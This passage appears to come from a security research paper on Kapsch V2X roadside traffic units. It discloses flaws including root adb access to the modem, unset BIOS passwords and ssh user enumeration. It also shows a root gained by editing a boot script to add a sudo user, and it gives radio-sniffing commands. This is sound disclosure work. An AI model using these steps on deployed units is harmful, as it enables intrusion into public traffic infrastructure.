+at /mnt/c3platpersistent/opt/platform-tools/. You can just start an adb 
+shell and you'll have root access to the modem. If the c3platpersistent 
+partition isn't automatically mounted (I ran into that on only one of the 
+units) you should first run lsblk, fdisk -l or whatever other way you want 
+to find the proper partition, then mount it. Now you should have access to
+it. Alternatively, the RSUs all had debs on them which can be installed via 
+the kpdkg (kapsh dpkg) command. The .deb that includes platform-tools is
+kapsch-persistence_1.1-beta-USDoT-QualcommCCA.deb. 
+
+Full command: kdpkg -i kapsch-persistence_1.1-beta-USDoT-QualcommCCA.deb
+
+Now it's accessible. 
+
+Alternatively with physical access, you can just plug into the microUSB
+port on the modem and adb shell.
+ 
+  PS C:\Android\Sdk\platform-tools> .\adb.exe devices  
+  * daemon not running; starting now at tcp:5037  
+  * daemon started successfully  
+  List of devices attached  
+  91dc4XXX
+  device  
+  
+  PS C:\Android\Sdk\platform-tools> .\adb.exe shell  
+  sh-3.2# 
+  whoami  
+  root  
+
+  sh-3.2# ls -lha  
+  total 8  
+  drwxr-xr-x   23 root  root  1.8K  Aug 16  2018  .  
+  drwxr-xr-x    3 root  root  224   Aug 16  2018  ..  
+  drwxr-xr-x    3 root  root  1.8K  Aug 16  2018  WEBSERVER  
+  drwxr-xr-x    2 root  root  15.6K Aug 16  2018  bin  
+  drwxr-xr-x    3 root  root  1.8K  Aug 16  2018  boot  
+  -rw-r--r--    1 root  root  160   Aug 16  2018  build.prop  
+  drwxr-xr-x    9 root  root  3.9K  Jun 19  07:43  cache  
+  drwxrwxr-x   19 root  root  7.0K  Jun 19  07:43  data  
+  drwxr-xr-x    5 root  root  5.0K  Aug 16  2018  dev  
+  drwxrwxr-x   35 root  root  7.0K  Aug 16  2018  etc  
+  drwxrwxr-x    5 43514  200   360   Jul  1 2018  firmware  
+ 
+
+--[ 5.7 - Weak or Unset Default BIOS Supervisor/User Passwords Allow 
+          Unauthorized Firmware Access - CVE-2025-25737
+
+Yeah... this one might just be petty? Idk, here you go. This vulnerability 
+affects both the 9160 and 9260 RSUs and is a result of misconfigurations. 
+I found it within both the new and used units. By default, the Phoenix 
+SecureCore BIOS has a password policy requiring just 1 character. More 
+importantly, the Phoenix SecureCore BIOS, by default, has both the User
+& Supervisor passwords unset. Again, if either of these passwords were 
+set, it'd be a lot more annoying to get started poking at these units. 
+Another thing to note, TPM is supported but not detected.
+ 
+Here's the relevant output:
+  Phoenix SecureCore Technology Setup  
+  ----------------------------------------------------  
+  Main     Advanced     Security     Boot     Exit  
+ 
+  ----------------------------------------------------  
+  Supervisor Password is:    Cleared  
+  User Password is:          Cleared
+  
+ 
+  Set Supervisor Password    [Enter]  
+  Supervisor Hint String     [ ]  
+ 
+  Set User Password          [Enter]  
+  User Hint String           [ ]  
+ 
+  Min. password length       [ 1 ]  
+ 
+  Authenticate User on Boot  [Disabled]  
+ 
+  HDD Security Status        No HDD detected  
+ 
+  Trusted Platform Module (TPM)  
+ 
+  ----------------------------------------------------  
+                   Item Specific Help  
+  ----------------------------------------------------  
+  Set or clear the  
+  Supervisor account's  
+  password.  
+ 
+  ----------------------------------------------------  
+  F1  Help       ↑↓ Select Item    +/- Change Values  
+  Esc Exit
+  ◇ Select Menu     Enter Select > Sub-Menu  
+  F9  Setup Defaults  
+  F10 Save and Exit  
+  ----------------------------------------------------  
+
+
+--[ 6 - Phase 2: Onto the (C)V2X Client/Server Stack
+
+--[ 6.1 - Can I have some more?
+
+At this point it is easy to tell that there is still so much to this 
+embedded device to hack. I haven't even figured out what that second RJ45 
+port is for, I haven't determined what all the holes and pads are for. 
+I haven't soldered a second USB port to the proper pads. I haven't explored
+custom bridge boards, or even delved very deep into the LTE modem (although 
+I have confirmed it has default passwords and web services set up). I
+haven't messed with the boot over LAN or mSata port.
+
+I think the point is clear, just at a high level there is so much more to 
+explore. And I definitely plan to but not within the next phase of my 
+reverse engineering. This is both a curse and a blessing. These devices 
+are fairly new and are such dark holes, that there is so much untapped 
+potential to hack 'em all.
+
+
+--[ 6.2 Android/iOS Applications
+
+Turns out that there are already at least three applications that can 
+interact with the RSU server that these units run. They are available 
+for both Android & iOS and are called "Kapsch TrafficAssist, Kapsch V2X 
+Assist, Kapsch V2X Insight." There is also a "GeauxPass" application I 
+haven't looked at all. The one I found especially interesting is the 
+Insight application as it allows you to view or modify some aspects of 
+the RSU server. It also displays logs and it nice to use to confirm that 
+the RSU stack is running at least. It also gives you insight to the sheer 
+amount of data this RSU can collect. [18]
+
+I haven't gone much deeper than throwing the Android apps into MobSF but 
+it is definitely high on my list to start to take a peek at.
+
+
+--[ 6.3 - RSU Server Stack
+
+Another at the tippity top of my TODO list is to start testing the RSU 
+Server Stack. Or at this point, just reverse engineer it enough to 
+understand it confidently. There are so many components within V2X like 
+WAVE, IPANet, CW-LLC, DSRC, ITS-G5, SAE J2735/XX, 11p, 3GPP LTE-V2X, etc, 
+that the RSU supports and that doesn't include other intelligent traffic 
+systems like crosswalks, bridges, tolls, lights, etc.. I did mention some 
+of the notable binaries, but there are many more I didn't get to mention in
+Phase 1. Hopefully the OBUs I acquired will make this easier for me as well.
+
+
+--[ 6.4 - Remote/Wireless Exploits
+
+Obviously the creme de la creme would be an over the air exploit to get an 
+initial foothold. Although some of the protocol components have had some 
+vulnerabilities in the past, there is still definitely a lot of empty space 
+that needs to be researched and tested. The fact that these devices are 
+used in critical infrastructure, are mounted onto poles where thousands of
+cars will pass and broadcast V2X by design, there's definitely an itch in 
+my brain saying there's something there. But as of yet, I will continue to 
+take one step forward at a time with a over the air exploit as the 
+destination.
+
+
+--[ 7 - Random Nuggets
+
+--[ 7.1 - Sniffing, Outdated Components, Certificates & Keys, External 
+          (Web Services) Oh my!
+
+Here is some information that I couldn't get to in this paper but I found 
+interesting, valuable or just plain cool. Don't expect any rhyme or reason 
+please, just enjoy.
+ 
+Most of the units ran a version of ssh that is vulnerable to user 
+enumeration. When I acquired the first unit, I spent probably close to 6 
+hours attempting to gain access to the rescue EOS that it was by booting 
+into by default. I must've tried half a million or more possible usernames, 
+but besides root, only ended up getting discovering the user 'kapsch' by 
+adding it to a small wordlist I just created off the top of my head. 
+
+While focusing first on the rescue EOS, I gained root access by modifying
+the custom bash script that is executed upon boot. So I was super excited
+when I saw:
+ 
+  [  OK  ] Started watchdog daemon.  
+  Creating user 'gainsec' ...
+  cp: cannot stat '/etc/eeprom-cb/s.publickey.gainsec': No such file or
+  directory  
+  chmod: cannot access '/home/gainsec/.ssh/authorized_keys':
+  No such file or directory  
+  User 'gainsec' created with SSH access.
+  Adding 'gainsec' to sudo group for root privileges...  
+  Granting
+  'gainsec' root privileges...  
+                                        
+  Copyright (c) Kapsch Traffic COM AG 2016  
+  
+  GainSec was Here 
+  
+  LEO RESCUE system version 4.6.0.1211.28  
+  useradd: user 'kapsch'
+  already exists  
+  INFO: Updating /etc/shadow  
+  [    0.000000] DMI:
+  N/A N/A/COMe-mBTi10, BIOS MVV1976 X64 10/10/2017  
+  Kontron Board found,
+  ready to go  
+  [   25.082404] FAT-fs (mmcblk1p1): Volume was not properly unmounted. Some 
+  data may be corrupt. Please run fsck.  
+  [   25.082404] FAT-fs (mmcblk1p1): Volume was not properly unmounted. Some 
+  data may be corrupt. Please run fsck.  
+  boot-counter was set to 2  
+  
+  Debian
+  GNU/Linux 9 PEM00076 ttyS0  
+  
+  PEM000XX login:  [   26.153799] random: crng init done  
+  [   26.153799] random: crng init done  
+  [   26.160642] random: 7 urandom warning(s) missed due to ratelimiting  
+  [   26.160642] random: 7 urandom warning(s) missed due to ratelimiting  
+
+
+Little did I know, the EOS is configured with the SUID bits set incorrectly.
+So, sudo is not possible. Since it’s a squashfs, it's mounted as read-only
+and without root access you can't remount with write access so... yeah
+that was a little heart breaking.
+
+The EOS utilizes ELBE which uses Debian.
+ 
+The roadside RSU server application actually utilizes SNMP for a lot of 
+functionality and includes a honeypot called herbert.
+
+The /mnt/rescuefs/usr/tmplt/etc/elbe_base.xml seems to contain the 'kapsch' 
+user's default password but as you can probably guess, it isn't actually.
+
+
+  <suite>jessie</suite>
+  </project>
+  <target>
+  <hostname>CB-9160</hostname>
+  <domain />
+  <passwd>rmrf</passwd>
+  
+  <console>/dev/null,</console>
+  <package>
+  <squashfs>
+  <name>root.sfs</name>
+  </squashfs>
+  </package>
+  <finetuning>
+  <adduser groups="sudo,i2c" passwd="" shell="/bin/bash">kapsch</adduser>
+  <b2t_cp path="../../linux-image-3.16.35-c3p+_3.16.35.125.23_i386.deb">
+  /tmp/
+  </b2t_cp> 
+
+To decode the I2C data when gathering it via bus pirate, you can use xxd.
+Or, in powershell: 
+[System.Text.Encoding]::ASCII.GetString(([byte[]](I2C-HEX)))
+ 
+You can test the CV2X radios with the acme binary by using the following 
+commands:
+
+  /etc/init.d/start_cv2x_le start
+
+  cv2x-config --register-sps-flow 1,10,1,200,287,2500,2600
+ 
+  acme -RVAe -i rmnet_data1
+ 
+  acme -A -i rmnet_data1
+
+Alternatively, for the 9160s you can do the following:
+ 
+  ip link show
+  cd /mnt/c3platpersistent/opt/11p/bin/llc-v13
+  sudo ./llc chconfig -s -w SCH -c 172 -r b -m MK2MCS_R12QPSK -p 33
+  sudo ./llc chconfig -s -w CCH -c 172 -r b -m MK2MCS_R12QPSK -p 33
+  
+  sudo ip link
+  set cw-llc promisc on
+  sudo ip link set wave1 promisc on
+  sudo ip link
+  set cw-mon-rxb promisc on
+  sudo ip link set cw-mon-txb promisc on
+  
+  sudo tcpdump -i wave1 -w /home/kapsch/microSD/wave1_traffic.pcap &
+  sudo tcpdump -i cw-llc -w /home/kapsch/microSD/cw_llc_traffic.pcap
+
+Then run a simple loop to check for valid data coming in:
+
+  while true; do ./llc count | grep 'Rx MAC Valid Data Frames\|Rx MAC 
+  Broadcast Frames' && sleep 3; done
+
+You can also monitor the following directories for logs:
+
+  /var/log/pcap/RadioA/
+  /var/log/pcap/RadioB/
+  /mnt/c3platpersistent/var/log/
+  /home/kapsch/microSD/*pcap
+
+If your unit has both radios:
+
+  sudo ip link set wave-raw promisc on
+  sudo ip link set wave-mgmt promisc on
+   
+  sudo tcpdump -i wave-raw -w dsrc_traffic.pcap
+  sudo tcpdump -i wave-mgmt -w dsrc_traffic.pcap
+   
+  sudo ip link set wave0 up
+  sudo ip link set wave0 promisc on
+   
+  sudo ./llc chconfig -s -w CCH -c 178 -r a -m MK2MCS_R12QPSK -p 33
+  sudo ./llc chconfig -s -w SCH -c 178 -r a -m MK2MCS_R12QPSK -p 33
+  sudo tcpdump -i wave0 -w /home/kapsch/microSD/wave0_traffic.pcap
+ 
+Now this is just what I've concluded and I have not gone through all 
+channels and modulations yet. I did however, drive for about 20 minutes 
+with an RSU sniffing and found no signals. 
+
+On my website, gainsec.com I've also gone through how to use a SDR to 
+sniff/send out V2X packets which helped confirm that these test binaries 
+were working as expected. 
+ 
+Example Setup for U.S. V2X Channels
+
+| Radio Interface | Channel Type | Channel Number | Frequency (MHz) |
+|-----------------|--------------|----------------|-----------------|
+| A wave0         | CCH          | 178            | 5890            |
+| A wave0         | SCH          | 172            | 5860            |
+| B wave1         | SCH          | 184            | 5920            |
+| B wave1         | SCH          | 180            | 5900            |
+
+j2735_version == 2016
+
+The read-only UART is via the hardware side (not 100% confident) so by 
+soldering the connections it's likely possible to get full UART access. 
+
+Additionally, once the EOS loads, the keyboard connected via the USB port 
+that works up to that point stops functioning so I wasn't ever able to try 
+any password once shown the login prompt when booting into the RESCUE
+image. Same goes for booting into single user mode by adding "single"
+to the APPEND kernel parameter line. In fact, when booting into single
+user mode, it states ask us for the password and we'll give it to you,
+but it still isn't clear if there even is a password. 
+ 
+All kinds of interesting certificates, keys, etc were found. Such as 
+net-snmp-cert used by the RSU server. os_image_sign.pubkey, 
+ca-certificates.crt, ssh host keys were also stored in the EEPROM. Also, 
+if the RSU was configured to have the 'admin' user, that users hashed 
+password was stored in EEPROM as well. You can also enable/disable that 
+user via EEPROM changes as well. There was also a 'manage-certs' directory 
+that contained a ton of links to other organizations cert files, and then 
+the URLs to enroll the RSU into their ITS traffic management systems (or 
+perhaps just enable cross communication?).
+ 
+Think I can leave it at that, there's so much that is interesting, 
+I can list things forever...
+
+
+--[ 8 - References
+ 
+[1] https://apkpure.com/kapsch-ewalk/net.kapsch.ewalk/versions
+[2] https://5gaa.org/c-v2x-explained/
+[3] https://github.com/usdot-fhwa-OPS/V2X-Hub
+[4] https://www.wjbf.com/business/press-releases/accesswire/
+983795/kapsch-trafficcom-supports-colorado-connected-vehicle-safety-project/
+[5] https://www.kapsch.net/_Resources/Persistent/
+7b221a05b49b2d630a46508667e0d52de5f2efe7/
+Reference_Factsheet_Colorado_DOT_I-70_Corridor_EN.pdf
+[6] https://www.kapsch.net/_Resources/Persistent
+/59824d4e81dce9d1a902359261304f6cf8231654/KTC-CVS-Reference_Ohio_33-SMC.pdf
+[7] https://www.kapsch.net/en/press/releases/ktc-20240702-pr-en
+[8] https://www.traffictechnologytoday.com/news/
+connected-vehicles-infrastructure
+/kapsch-supplying-equipment-for-australias-
+largest-c-its-connected-vehicle-pilot-project.html
+[9] https://www.etsi.org/deliver/etsi_en/302600_302699/302663/
+01.02.00_20/en_302663v010200a.pdf
+[10] https://di9mr54a05a64.cloudfront.net/api-mciaustralia.expoplatform.com/
+media/MTYxODI3MDY3NzYwNzRkOWQ1ZThlYTI%3D.pdf
+[11] https://www.kapsch.net/_Resources/Persistent/
+3d251a8445e0bf50093903ad70b3dbed34dec7e7/
+KTC-CVS_RIS-9260_DataSheet.pdf
+[12] https://www.kapsch.net/_Resources/Persistent
+/b60658fe131d82fe20c5389cdc2f6425064f4a88/
+KTC-CVS_RIS-9360_DataSheet.pdf
+[13] https://fcc.report/FCC-ID/XZU9160/
+[14] https://www.mouser.com/datasheet/2/965/come_mbt10_datasheet-3235566.pdf
+[15] https://content.u-blox.com/sites/default/files/
+EVK-THEO-P1_UserGuide_%28UBX-15013939%29.pdf
+[16] https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/
+DEF%20CON%2025%20-%20Woodbury-and-Haltmeyer-
+Linux-Stack-Based-V2X-Framework-Hack-Connected-Vehicles.pdf
+[17] https://chipsec.github.io/index.html
+[18] https://play.google.com/store/apps/developer?id=Kapsch+TrafficCom+AG&hl=en_US
+
+
+--[ 9 - Raw Output
+
+For an extensive collection of logs and tool output from the devices 
+mentioned in this paper, please check out this repo:
+
+https://github.com/GainSec/Phrack-72-Raw-Output-V2X
+
